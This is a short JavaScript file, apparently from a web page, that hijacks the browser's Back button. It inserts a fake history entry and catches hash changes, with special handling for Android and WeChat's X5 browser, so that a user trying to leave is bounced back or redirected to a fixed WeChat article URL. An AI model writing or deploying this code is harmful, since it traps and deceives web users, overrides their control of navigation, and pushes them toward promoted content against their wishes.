(function(){
    function gogg(backUrl){
        history.pushState(history.length+1, "message", window.location.href.split('#')[0]+"#"+new Date().getTime());
        if(navigator.userAgent.indexOf('Android') != -1){
            if(typeof(tbsJs) != "undefined"){
                tbsJs.onReady('{useCachedApi : "true"}', function(e) {});
                window.onhashchange=function(){
                    top.location.href = backUrl;
                };
            }else{
                var pop = 0;
                window.onhashchange = function(event) {
                    pop++;
                    if (pop >= 3) {
                        top.location.href = backUrl;
                    }else{
                        history.go(1);
                    }
                };
                history.go(-1);
            }
        }else{
            window.onhashchange=function(){
                top.location.href = backUrl;
            };
        }
    }

    function get(url, fn) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url, false);
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && xhr.status == 200 || xhr.status == 304) {
                fn.call(this, xhr.responseText);
            }
        };
        xhr.send();
    }
    
    gogg("https://mp.weixin.qq.com/s/iogO1msHl8HW2YKgV6ZMSA");
})();